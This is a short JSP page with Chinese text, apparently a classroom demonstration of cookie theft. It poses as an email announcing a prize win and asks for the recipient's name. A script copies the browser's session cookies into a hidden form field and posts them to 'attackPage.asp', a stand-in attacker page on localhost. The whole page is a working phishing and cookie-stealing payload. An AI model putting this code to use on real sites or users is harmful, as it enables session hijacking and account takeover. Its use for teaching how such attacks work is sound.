<%@ page language="java" import="java.util.*" pageEncoding="gb2312"%>
<html>
<body>
<%
	//session检查，代码略
 %>
<!--以下是攻击者发送的一个邮件-->
这里有一封新邮件，您中奖了，请您填写您的姓名并且提交：<BR>
<script type="text/javascript">
	function send(){
		var cookie = document.cookie;
		document.form1.cookies.value=cookie;
		document.form1.submit();
	}
</script>
<form name="form1" action="http://localhost/attackPage.asp" method="post">
	输入姓名:<input name="">
	<input type="hidden" name="cookies">
	<input type="button" value="提交姓名" onClick="send()">
</form>
</body>
</html>
